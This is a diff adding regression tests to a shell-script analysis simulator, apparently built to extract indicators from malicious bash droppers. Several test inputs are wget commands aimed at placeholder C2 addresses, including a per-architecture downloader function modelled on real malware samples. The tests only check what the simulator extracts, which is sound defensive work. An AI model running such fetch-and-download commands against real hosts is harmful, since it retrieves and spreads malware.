@@ -127,3 +127,79 @@ def test_unresolvable_substitution_marked_unresolved_not_guessed():
     fetches = [a for a in result.actions if a.kind == "network_fetch" and a.command == "wget"]
     assert len(fetches) == 1
     assert fetches[0].resolved is False
+
+
+def test_partial_resolution_preserves_literal_text_not_collapsed_to_opaque_token():
+    # Regression: a real live sample's wget/curl calls used a URL word mixing a
+    # literal C2 IP with an unresolvable function parameter
+    # ("https://<ip>/$1"). The old code discarded the whole word -- including the
+    # static IP, the single most important IOC in the report -- and replaced it
+    # with the single opaque string "<unresolved>" purely because the word wasn't
+    # *fully* resolved. The literal portion must survive; only the genuinely
+    # unresolvable fragment should read as unresolved.
+    script = "wget http://192.0.2.120/$unset_var\n"
+    result = BashSimInterpreter().run(script)
+    fetches = [a for a in result.actions if a.kind == "network_fetch"]
+    assert len(fetches) == 1
+    assert "192.0.2.120" in fetches[0].args[0]
+    assert fetches[0].resolved is False
+
+
+def test_function_call_binds_positional_parameter_per_call_site():
+    # Regression: function bodies used to be walked exactly once, blind, at their
+    # definition point -- $1/$2/... could never resolve to anything concrete, so
+    # a helper function like dlr() below fetching "$C2/$1" always reported an
+    # opaque unresolved URL no matter how many times/what it was called with.
+    script = (
+        "dlr() {\n"
+        "  wget http://192.0.2.130/$1\n"
+        "}\n"
+        "dlr x86\n"
+        "dlr arm\n"
+    )
+    result = BashSimInterpreter().run(script)
+    fetches = [a for a in result.actions if a.kind == "network_fetch"]
+    urls = {a.detail["url"] for a in fetches}
+    assert urls == {"http://192.0.2.130/x86", "http://192.0.2.130/arm"}
+    assert all(a.resolved for a in fetches)
+
+
+def test_never_called_function_still_walked_once_as_fallback():
+    # A function defined but never invoked by a direct literal name anywhere
+    # (dead code, or only reachable via indirect/dynamic dispatch we can't track)
+    # must still surface its body at least once -- nothing should be silently
+    # dropped just because call-site resolution wasn't possible.
+    script = "unused() {\n  wget http://192.0.2.140/x\n}\n"
+    result = BashSimInterpreter().run(script)
+    fetches = [a for a in result.actions if a.kind == "network_fetch"]
+    assert len(fetches) == 1
+    assert fetches[0].detail["url"] == "http://192.0.2.140/x"
+    assert fetches[0].conditional is True
+
+
+def test_deep_elif_chain_branches_all_walked():
+    # Regression: bashlex nests the *second* and later elif/else branches of a
+    # chain as a raw list of further AST nodes tucked inside a reservedword
+    # node's .word attribute instead of as normal sibling parts. The old walker
+    # unconditionally skipped every reservedword node, silently discarding
+    # everything from the second elif onward -- confirmed via a real live sample
+    # with a 4-elif+else chain where 3 branches vanished entirely, not even as
+    # unresolved actions.
+    script = (
+        'if [ "$A" = a ]; then\n  wget http://192.0.2.150/a\n'
+        'elif [ "$A" = b ]; then\n  wget http://192.0.2.150/b\n'
+        'elif [ "$A" = c ]; then\n  wget http://192.0.2.150/c\n'
+        'elif [ "$A" = d ]; then\n  wget http://192.0.2.150/d\n'
+        'else\n  wget http://192.0.2.150/e\n'
+        'fi\n'
+    )
+    result = BashSimInterpreter().run(script)
+    fetches = [a for a in result.actions if a.kind == "network_fetch"]
+    urls = {a.detail["url"] for a in fetches}
+    assert urls == {
+        "http://192.0.2.150/a",
+        "http://192.0.2.150/b",
+        "http://192.0.2.150/c",
+        "http://192.0.2.150/d",
+        "http://192.0.2.150/e",
+    }
